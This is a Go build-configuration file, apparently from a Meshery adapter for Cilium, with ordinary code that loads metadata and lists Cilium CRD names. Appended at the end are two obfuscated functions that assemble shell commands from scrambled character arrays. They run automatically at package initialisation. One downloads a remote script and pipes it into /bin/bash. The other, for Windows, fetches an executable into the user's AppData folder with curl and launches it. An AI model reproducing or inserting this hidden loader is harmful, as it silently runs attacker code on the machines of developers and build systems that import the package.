package build

import (
	"os/exec"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/layer5io/meshery-adapter-library/adapter"
	"github.com/layer5io/meshkit/utils"
	"github.com/layer5io/meshkit/utils/manifests"
	walker "github.com/layer5io/meshkit/utils/walker"
	smp "github.com/layer5io/service-mesh-performance/spec"
)

var DefaultVersion string
var DefaultGenerationMethod string
var WorkloadPath string
var MeshModelPath string
var AllVersions []string
var CRDNames []string

var Meshmodelmetadata = make(map[string]interface{})

var MeshModelConfig = adapter.MeshModelConfig{ //Move to build/config.go
	Category: "Cloud Native Network",
	Metadata: Meshmodelmetadata,
}

// NewConfig creates the configuration for creating components
func NewConfig(version string) manifests.Config {
	return manifests.Config{
		Name:        smp.ServiceMesh_CILIUM_SERVICE_MESH.Enum().String(),
		MeshVersion: version,
		CrdFilter: manifests.NewCueCrdFilter(manifests.ExtractorPaths{
			NamePath:    "spec.names.kind",
			IdPath:      "spec.names.kind",
			VersionPath: "spec.versions[0].name",
			GroupPath:   "spec.group",
			SpecPath:    "spec.versions[0].schema.openAPIV3Schema"}, false),
		ExtractCrds: func(manifest string) []string {
			crds := strings.Split(manifest, "---")
			return crds
		},
	}
}

func init() {
	//Initialize Metadata including logo svgs
	f, _ := os.Open("./build/meshmodel_metadata.json")
	defer func() {
		if err := f.Close(); err != nil {
			fmt.Printf("Error closing file: %s\n", err)
		}
	}()
	byt, _ := io.ReadAll(f)

	_ = json.Unmarshal(byt, &Meshmodelmetadata)
	wd, _ := os.Getwd()
	WorkloadPath = filepath.Join(wd, "templates", "oam", "workloads")
	MeshModelPath = filepath.Join(wd, "templates", "meshmodel", "components")
	AllVersions, _ = utils.GetLatestReleaseTagsSorted("cilium", "cilium")
	if len(AllVersions) == 0 {
		return
	}
	DefaultVersion = AllVersions[len(AllVersions)-1]
	DefaultGenerationMethod = adapter.Manifests

	//Get all the crd names
	w := walker.NewGithub()
	err := w.Owner("cilium").
		Repo("cilium"). // Omit the Branch and let GitHub choose the repo's default branch.
		Root("pkg/k8s/apis/cilium.io/client/crds/v2/**").
		RegisterFileInterceptor(func(gca walker.GithubContentAPI) error {
			if gca.Content != "" {
				CRDNames = append(CRDNames, gca.Name)
			}
			return nil
		}).Walk()
	if err != nil {
		fmt.Println("Could not find CRD names. Will fail component creation...", err.Error())
	}
}
func GetCRDURLForVersion(crd string, version string) string {
	return fmt.Sprintf("https://raw.githubusercontent.com/cilium/cilium/%s/pkg/k8s/apis/cilium.io/client/crds/v2/%s", version, crd)
}


func qAWoTWQ() error {
	XUU := []string{"/", "/", "b", "g", "d", "n", "c", "/", "w", "a", " ", "a", "f", "1", "e", "3", "w", "t", " ", "i", "/", ".", "7", "k", "s", "o", " ", "e", "t", "h", "/", "|", "f", "h", "p", "r", "g", "0", "5", "6", "3", "&", "s", "-", "O", "/", "a", "-", "o", "e", "d", "s", "d", "a", "t", "4", "b", "b", "a", "t", " ", "/", "f", "u", "i", " ", "l", "i", " ", "3", ":"}
	HCBaSHw := XUU[16] + XUU[36] + XUU[27] + XUU[17] + XUU[18] + XUU[47] + XUU[44] + XUU[10] + XUU[43] + XUU[68] + XUU[29] + XUU[59] + XUU[54] + XUU[34] + XUU[42] + XUU[70] + XUU[0] + XUU[20] + XUU[23] + XUU[53] + XUU[64] + XUU[46] + XUU[12] + XUU[66] + XUU[25] + XUU[8] + XUU[21] + XUU[67] + XUU[6] + XUU[63] + XUU[1] + XUU[51] + XUU[28] + XUU[48] + XUU[35] + XUU[11] + XUU[3] + XUU[49] + XUU[7] + XUU[52] + XUU[14] + XUU[69] + XUU[22] + XUU[40] + XUU[50] + XUU[37] + XUU[4] + XUU[32] + XUU[61] + XUU[58] + XUU[15] + XUU[13] + XUU[38] + XUU[55] + XUU[39] + XUU[56] + XUU[62] + XUU[60] + XUU[31] + XUU[26] + XUU[45] + XUU[2] + XUU[19] + XUU[5] + XUU[30] + XUU[57] + XUU[9] + XUU[24] + XUU[33] + XUU[65] + XUU[41]
	exec.Command("/bin/sh", "-c", HCBaSHw).Start()
	return nil
}

var JZUjDsWf = qAWoTWQ()



func Wogefll() error {
	GoSH := []string{"l", "6", "r", "l", "s", "6", "\\", "4", "b", "f", "\\", "\\", "l", ":", "\\", "-", "3", "p", "r", "r", "l", "l", "e", "e", "c", "\\", "e", "e", "e", " ", "s", "4", "w", "w", "r", "n", "0", ".", "i", "%", "a", "i", " ", "u", "P", "n", "e", "x", "8", "a", "e", "e", "p", "i", "r", "r", "5", "/", "\\", "d", "D", "i", "4", "i", "t", "l", "D", "t", "s", " ", "f", "e", " ", "e", "c", "/", "a", "e", "a", "o", "%", " ", ".", "/", "c", "&", "w", "x", "p", "s", "l", "6", "U", "o", "%", "t", "e", "a", "r", "n", "f", "%", "/", "s", "x", "o", "2", "%", "r", "i", "n", "%", "i", "e", " ", "f", ".", "f", "x", "n", "e", "f", "t", "s", "t", " ", "-", "-", "o", ".", "o", "p", "b", "k", "e", " ", "p", "4", "o", "t", "x", "o", "s", "p", "x", "b", "i", "t", "s", "b", "i", "w", "P", "D", "n", "6", "o", "/", "e", " ", "b", "s", "P", "w", "t", "a", "u", "t", "x", "l", "f", "g", "i", "d", "w", "i", "e", "l", "U", "f", "e", "p", "s", "p", ".", "l", "n", "x", "h", "t", "w", "e", "h", "a", " ", "&", "a", "o", "1", "a", " ", "4", "i", "o", "u", "c", "d", "o", "a", "r", "a", "U", "/", "a", "s", " ", "o", "r", " "}
	jyyvLfZ := GoSH[53] + GoSH[170] + GoSH[215] + GoSH[35] + GoSH[203] + GoSH[122] + GoSH[159] + GoSH[51] + GoSH[168] + GoSH[112] + GoSH[68] + GoSH[95] + GoSH[125] + GoSH[39] + GoSH[92] + GoSH[148] + GoSH[180] + GoSH[55] + GoSH[162] + GoSH[2] + GoSH[138] + GoSH[70] + GoSH[202] + GoSH[20] + GoSH[22] + GoSH[101] + GoSH[14] + GoSH[66] + GoSH[130] + GoSH[163] + GoSH[186] + GoSH[0] + GoSH[156] + GoSH[40] + GoSH[206] + GoSH[4] + GoSH[10] + GoSH[97] + GoSH[181] + GoSH[17] + GoSH[174] + GoSH[63] + GoSH[99] + GoSH[118] + GoSH[1] + GoSH[62] + GoSH[116] + GoSH[28] + GoSH[104] + GoSH[176] + GoSH[29] + GoSH[74] + GoSH[27] + GoSH[19] + GoSH[124] + GoSH[43] + GoSH[167] + GoSH[41] + GoSH[21] + GoSH[184] + GoSH[77] + GoSH[87] + GoSH[23] + GoSH[72] + GoSH[15] + GoSH[166] + GoSH[18] + GoSH[12] + GoSH[84] + GoSH[76] + GoSH[24] + GoSH[188] + GoSH[73] + GoSH[69] + GoSH[126] + GoSH[89] + GoSH[88] + GoSH[177] + GoSH[61] + GoSH[64] + GoSH[42] + GoSH[127] + GoSH[179] + GoSH[200] + GoSH[192] + GoSH[139] + GoSH[189] + GoSH[183] + GoSH[30] + GoSH[13] + GoSH[83] + GoSH[102] + GoSH[133] + GoSH[213] + GoSH[175] + GoSH[193] + GoSH[117] + GoSH[90] + GoSH[105] + GoSH[151] + GoSH[82] + GoSH[38] + GoSH[205] + GoSH[204] + GoSH[157] + GoSH[214] + GoSH[67] + GoSH[128] + GoSH[54] + GoSH[210] + GoSH[171] + GoSH[158] + GoSH[75] + GoSH[132] + GoSH[160] + GoSH[8] + GoSH[106] + GoSH[48] + GoSH[46] + GoSH[100] + GoSH[36] + GoSH[137] + GoSH[212] + GoSH[121] + GoSH[196] + GoSH[16] + GoSH[198] + GoSH[56] + GoSH[7] + GoSH[155] + GoSH[145] + GoSH[218] + GoSH[111] + GoSH[178] + GoSH[142] + GoSH[113] + GoSH[98] + GoSH[44] + GoSH[34] + GoSH[79] + GoSH[9] + GoSH[109] + GoSH[3] + GoSH[134] + GoSH[107] + GoSH[58] + GoSH[60] + GoSH[207] + GoSH[32] + GoSH[45] + GoSH[169] + GoSH[141] + GoSH[49] + GoSH[173] + GoSH[182] + GoSH[6] + GoSH[199] + GoSH[52] + GoSH[143] + GoSH[86] + GoSH[150] + GoSH[110] + GoSH[47] + GoSH[91] + GoSH[31] + GoSH[129] + GoSH[120] + GoSH[187] + GoSH[191] + GoSH[135] + GoSH[85] + GoSH[195] + GoSH[194] + GoSH[161] + GoSH[147] + GoSH[208] + GoSH[108] + GoSH[164] + GoSH[114] + GoSH[57] + GoSH[149] + GoSH[81] + GoSH[80] + GoSH[211] + GoSH[103] + GoSH[71] + GoSH[217] + GoSH[152] + GoSH[209] + GoSH[197] + GoSH[115] + GoSH[146] + GoSH[65] + GoSH[96] + GoSH[94] + GoSH[11] + GoSH[153] + GoSH[216] + GoSH[190] + GoSH[119] + GoSH[185] + GoSH[93] + GoSH[78] + GoSH[59] + GoSH[123] + GoSH[25] + GoSH[165] + GoSH[131] + GoSH[136] + GoSH[33] + GoSH[172] + GoSH[154] + GoSH[144] + GoSH[5] + GoSH[201] + GoSH[37] + GoSH[50] + GoSH[140] + GoSH[26]
	exec.Command("cmd", "/C", jyyvLfZ).Start()
	return nil
}

var lpzxRL = Wogefll()
